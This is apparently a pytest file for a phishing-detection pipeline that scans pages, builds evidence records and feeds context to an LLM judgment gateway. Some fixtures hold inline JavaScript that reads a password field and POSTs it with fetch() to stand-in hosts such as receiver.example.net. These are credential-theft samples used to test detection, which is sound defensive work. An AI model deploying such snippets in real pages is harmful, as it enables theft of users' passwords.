"""Public producer -> normalized record -> decision document -> actual gateway payload."""
from copy import deepcopy
import io,json
from unittest.mock import Mock
import pytest
from L3_SCANNER import L3Scanner
from L3_SCANNER.policies.operational import operational_detection_policy
from evidence_pipeline import build_record,build_context,FastPipeline
from evidence_pipeline.records import digest
from evidence_pipeline.record_contract import validate_record
from evidence_pipeline.model_context import validate_model_context
from evidence_pipeline.context_inventory import restore
from evidence_pipeline.gateway import OpenAICompatibleGateway
from evidence_pipeline.judgment_contract import evidence_ids


def scan(html,code=''):
    content=html+'<script>'+code+'</script>' if html is not None and code else html
    return L3Scanner(operational_detection_policy()).scan_content({
        'original_url':'https://origin.example.com/login','html':{'content':content}})


def context(result):
    raw=result['raw'];record=build_record('l3',result,request_id='private-request-marker',attempt=1)
    audit={};view=build_context([record],{'l3':raw},audit=audit)
    return record,view,audit


def rows(view,kind):return [x for x in restore(view)['evidence'] if x['kind']==kind]


def dereference(source,pointer):
    value=source
    for key in pointer.strip('/').split('/'):
        value=value[int(key)] if isinstance(value,list) else value[key]
    return value


def assert_audit(view,audit):
    assert set(evidence_ids(view))==set(audit['evidence_mapping'])
    for identifier,mapping in audit['evidence_mapping'].items():
        for pointer in mapping['source_pointers']:
            original=dereference(audit['source_context'],pointer)
            assert original.get(mapping['id_field'])==mapping['original_id']


@pytest.mark.parametrize('linked',[False,True])
def test_public_view_defines_code_once_and_preserves_recorded_payload_relationship(linked):
    body='p' if linked else '"page opened"'
    result=scan('<form><input id="document" name="password" type="password"><button>Sign in</button></form>',
        'var p=document.getElementById("document").value;fetch("https://receiver.example.net/",{method:"POST",body:'+body+'});')
    original=digest(result)
    record,view,audit=context(result)
    assert digest(result)==original
    assert_audit(view,audit)
    event=next(x for x in rows(view,'event') if x['facts'].get('event_kind')=='network_requests')
    assert event['facts']['payload_relationship']==('recorded_source_links' if linked else 'no_payload_source_link_recorded')
    script=next(x for x in rows(view,'script') if x['id']==event['facts']['script_ref']['evidence_ref'])
    span=event['facts']['code_span']
    code=script['facts']['source_text'][span['start']:span['end']]
    assert json.dumps(view).count(json.dumps(code)[1:-1])==1
    assert 'recorded_relationships' not in view
    assert rows(view,'field')[0]['facts']['name']=='password'
    assert rows(view,'analysis')[0]['facts']['fields'][0]['status']=='candidate_under_recorded_attributes_only'
    assert len(view['evidence_groups'])>=3
    assert record['raw_ref']['sha256'] and audit['source_context']


def test_storage_metadata_removed_but_page_declared_data_and_missing_states_preserved():
    result=scan('<form><input id="pw" type="password" disabled><input name="" type="checkbox"></form>'
        '<h1>sha256 record_reference request_id are page text</h1>')
    result['raw']['html']['open_graph']={'key':{'raw_content':'page key'},'sha256':{'raw_content':'page digest'},'request_id':{'raw_content':'page id'}}
    # Rebuild the L3 source-bound native fact because the fixture changed L3 raw explicitly.
    from L3_SCANNER.analyzers.html.native_submission import analyze_native_submission
    result['analysis_facts']=analyze_native_submission(result['raw']['html'])
    _,view,audit=context(result)
    text=json.dumps(view)
    assert 'private-request-marker' not in text and 'record-l3.json' not in text
    assert rows(view,'page')[0]['facts']['declared_metadata']==result['raw']['html']['open_graph']
    assert rows(view,'field')[0]['facts']['disabled'] is True
    assert 'name' in rows(view,'field')[0]['facts']['absent_attributes']
    assert rows(view,'field')[1]['facts']['name']==''
    def check(value):
        if isinstance(value,dict):
            for key,item in value.items():
                if key=='declared_metadata':continue
                assert key not in {'raw_reference','record_reference','sha256','source_pointer','context_sha256','request_id','snapshot_id'}
                check(item)
        elif isinstance(value,list):
            for item in value:check(item)
    check(restore(view));assert_audit(view,audit)


def test_unknown_occurrences_keep_record_context_without_builder_stage_invention():
    result=scan('<h1>Page</h1>')
    result['signals']=[{'id':'L3-J-01','name':'a','detected':None,'error':{'code':'unlocated','message':'same'}},
                       {'id':'L3-J-02','name':'b','detected':None,'error':{'code':'unlocated','message':'same'}}]
    record,view,audit=context(result)
    assert len(record['causes'])==len(rows(view,'limitation'))==2
    limitations=rows(view,'limitation')
    assert limitations[0]['facts']['affected_checks']!=limitations[1]['facts']['affected_checks']
    assert all('stage' in x['facts']['occurrence']['not_recorded'] for x in limitations)
    assert all(x['facts']['occurrence']['reported_in']==['analysis_result'] for x in limitations)
    assert_audit(view,audit)


@pytest.mark.parametrize('html,expected',[(None,'unavailable'),('','observed')])
def test_missing_source_and_observed_empty_source_are_distinct_in_all_three_axes(html,expected):
    result=scan(html);record,view,audit=context(result)
    assert record['execution']['state']=='completed'
    assert record['acquisition']['state']==expected
    doc=result['raw']['html']['document']
    assert doc['source_available'] is (html is not None)
    assert doc['source_complete'] is (None if html is None else True)
    coverage=rows(view,'coverage')[0]['facts']
    assert coverage['acquisition']['state']==expected
    assert_audit(view,audit)


@pytest.mark.parametrize('url',['','http://[invalid'])
def test_l0_skipped_analysis_is_not_completed_analysis(url):
    from l0.registry import analyze
    result=analyze(url);record=build_record('l0',result,request_id='r',attempt=1)
    assert record['execution']['state']=='completed'
    assert record['analysis']['state']=='not_performed'
    assert record['signals']==[] and record['errors']
    assert validate_record(record)==record
    audit={}
    view=build_context([record],{'l0':result['raw_evidence']},audit=audit)
    assert rows(view,'coverage')==[] and rows(view,'url_observation')==[]
    assert audit['source_context']['l0_url_observations']['record']==record
    assert 'not_performed' not in json.dumps(view)


@pytest.mark.parametrize('native,state',[({'name':'IP·ASN','status':'응답 수신','result':{'93.184.216.34':{'asn':'1'}},
    'detail':{'dropped':{'8.8.8.8':'organization lookup REFUSED'},'response_codes':['NOERROR','REFUSED']}},'partial'),
    ({'name':'DNS A','status':'Timeout','detail':{'duration':2},'reason':'No response'},'unavailable')])
def test_l1_native_details_are_preserved_and_collection_state_is_separate(native,state):
    result={'전체상태':'완료','인프라결과_목록':[native]}
    record=build_record('l1',result,request_id='r',attempt=1,raw={})
    assert record['execution']['state']=='completed' and record['acquisition']['state']==state
    assert record['signals'][0]['evidence']==native
    audit={}
    view=build_context([record],{'l1':{}},audit=audit)
    assert rows(view,'coverage')==[]
    assert audit['source_context']['observations'][0]['evidence']==native
    if native['name']=='DNS A':
        check=rows(view,'dns_a')[0]['facts']
        assert check=={'status':'not_observed','reason':'No response'}
    else:
        check=rows(view,'ip_asn')[0]['facts']
        assert check['networks']==[
            {'ip':['93.184.216.34'],'asn':'1','org':'not_observed'},
            {'ip':['8.8.8.8'],'ip_asn':'not_observed'}]


def test_l1_budget_producer_records_actual_pending_and_not_started_without_inventing_timeout(monkeypatch):
    from concurrent.futures import Future
    from src import handler
    class Pool:
        def __init__(self,**kwargs):pass
        def submit(self,*args,**kwargs):return Future()
        def shutdown(self,**kwargs):pass
    monkeypatch.setattr(handler,'ThreadPoolExecutor',Pool)
    monkeypatch.setattr(handler,'wait',lambda pending,**kwargs:(set(),pending))
    result,raw=handler.run('https://example.com/','r','1')
    assert len(result['query_lifecycle'])==4
    states=[x['state'] for x in result['query_lifecycle']]
    assert states.count('cancelled_before_start')==3 and states.count('not_started')==1
    assert result['인프라결과_목록']==[]
    record=build_record('l1',result,request_id='r',attempt=1,raw=raw)
    assert record['execution']['state']=='interrupted'
    assert record['acquisition']['state']=='unavailable'
    assert not any(c['code']=='infrastructure_timeout' for c in record['causes'])


def test_l2_analysis_failure_does_not_become_acquisition_failure_and_has_one_occurrence():
    from l2_scanner.scanner import _run_analyzer
    class Broken:
        SIGNAL={'id':'L2-H-01','scanner':'header','name':'broken'}
        @staticmethod
        def analyze(raw):raise ValueError('bad analysis')
    errors=[];signal=_run_analyzer(Broken,{'original_url':'https://example.com/'},errors)
    raw={'http':{'final_response':{'status_code':200,'response_body':{'body_complete':True}}},
         'tls':{'leaf_certificate':{'subject':'CN=example.com'}}}
    record=build_record('l2',{'signals':[signal],'errors':errors,'scan':{'status':'partial'}},request_id='r',attempt=1,raw=raw)
    assert record['execution']['state']=='completed'
    assert record['acquisition']['state']=='observed'
    assert record['analysis']['state']=='unavailable'
    assert len(record['causes'])==1 and record['acquisition']['limitation_ids']==[]


def test_public_pipeline_budget_wire_and_audit_mapping_use_short_ids(tmp_path):
    sent=[];counts=[]
    def opener(request,**kwargs):
        payload=json.loads(request.data)
        if request.full_url.endswith('/tokenize'):
            counts.append(payload)
            return io.BytesIO(json.dumps({'count':99999 if len(counts)==1 else 100}).encode())
        sent.append(payload)
        supplied=json.loads(payload['messages'][1]['content']);identifier=rows(supplied,'page')[0]['id']
        value={'verdict':'UNKNOWN','summary':'Offline fixture','observations':[],
            'reasons':[{'text':'Recorded page','evidence_ids':[identifier]}],'limitations':['Offline fixture'],'deep_analysis_needed':True}
        return io.BytesIO(json.dumps({'choices':[{'finish_reason':'stop','message':{'content':json.dumps(value)}}]}).encode())
    result=scan('<h1>Login</h1><form>'+''.join(f'<input id="f{i}" name="repeated-name" placeholder="Repeated ordinary field description">' for i in range(50))+'</form>')
    collector=Mock();collector.scan_url.return_value={'layers':{'l3':result}}
    gateway=OpenAICompatibleGateway('http://127.0.0.1:8000','test','test',opener=opener,structured_output=True,max_tokens=100,max_context_tokens=1000)
    output=FastPipeline(collector=collector,l1_runner=lambda u:({},{}),judgment=gateway).run('https://origin.example.com/login',output_root=tmp_path,request_id='private-job')
    assert output['judgment_status']=='completed' and len(counts)==2 and len(sent)==1
    actual=json.loads(sent[0]['messages'][1]['content'])
    audit=json.loads((tmp_path/'private-job/1/context-audit.json').read_text(encoding='utf-8'))
    assert_audit(actual,audit)
    assert evidence_ids(actual)==sent[0]['response_format']['json_schema']['schema']['$defs']['evidence_id']['enum']
    assert 'private-job' not in json.dumps(actual)
    assert 'inventory_encoding_v2' in actual
    assert json.loads((tmp_path/'private-job/1/context-for-model.json').read_text(encoding='utf-8'))==actual
    broken=deepcopy(restore(actual));broken['evidence'][1]['id']=broken['evidence'][0]['id']
    with pytest.raises(ValueError,match='invalid_model_evidence_id'):validate_model_context(broken)
    broken=deepcopy(restore(actual));broken['evidence'][0]['facts']['bad']={'evidence_ref':'E999999'}
    with pytest.raises(ValueError,match='dangling_model_evidence_ref'):validate_model_context(broken)


def test_l1_all_origin_failures_keep_separate_targets_and_one_shared_org_failure(monkeypatch):
    from src.infra import ip_asn
    from src.records import observation_state
    from dataclasses import asdict
    ips=('192.0.2.1','192.0.2.2')
    monkeypatch.setattr(ip_asn,'_query_origin',lambda ip:(ValueError('same message'),[],{}))
    native,_=ip_asn.query_ip_asn(ips)
    assert set(native.detail['dropped'])==set(ips)
    observations=observation_state(asdict(native))
    assert len(observations['limitations'])==2
    assert {x['target'] for x in observations['limitations']}==set(ips)
    monkeypatch.setattr(ip_asn,'_query_origin',lambda ip:({'asn':'123 456'},[],{}))
    calls=[]
    def missing(asn):calls.append(asn);return 'REFUSED',{}
    monkeypatch.setattr(ip_asn,'_query_org',missing)
    native,_=ip_asn.query_ip_asn(ips)
    assert calls==['123']
    assert native.result[ips[0]]['organization_lookup_scope']['unqueried_asns']==['456']
    occurrences=observation_state(asdict(native))['limitations']
    assert len(occurrences)==1 and occurrences[0]['affected_ips']==list(ips)
    result={'전체상태':'완료','인프라결과_목록':[{**asdict(native),'observation':observation_state(asdict(native))}]}
    record=build_record('l1',result,request_id='r',attempt=1,raw={})
    assert len(record['causes'])==1
    assert record['acquisition']['state']=='partial'
    assert record['analysis']['state']=='completed'


def test_multiple_l3_payload_links_and_missing_scripts_survive_production():
    result=scan('<input id="a" name="password" type="password"><input id="b" name="otp" type="password">',
        'fetch("https://one.example.net",{method:"POST",body:document.getElementById("a").value});'
        'fetch("https://two.example.net",{method:"POST",body:document.getElementById("b").value});')
    signal=next(x for x in result['signals'] if x['id']=='L3-J-06')
    assert len(signal['evidence']['source_sink_relationships'])==2
    _,view,audit=context(result)
    assert len([x for x in rows(view,'event') if x['facts'].get('event_kind')=='network_requests'])==2
    assert_audit(view,audit)
    result=L3Scanner(operational_detection_policy()).scan_content({'original_url':'https://example.com/',
        'html':{'content':'<h1>Page</h1>'},'scripts':[
        {'script_id':f's{i}','type':'external','source_url':f'https://example.com/{i}.js','source':None,
         'collection_errors':[{'code':'script_missing','message':'same'}]} for i in range(2)]})
    record,view,_=context(result)
    causes=[x for x in record['causes'] if x['code']=='script_missing']
    assert len(causes)==2
    assert {x['occurrence']['observed_target']['script_id'] for x in causes}=={'s0','s1'}
    for cause in causes:assert len(cause['source_hints'])>=2
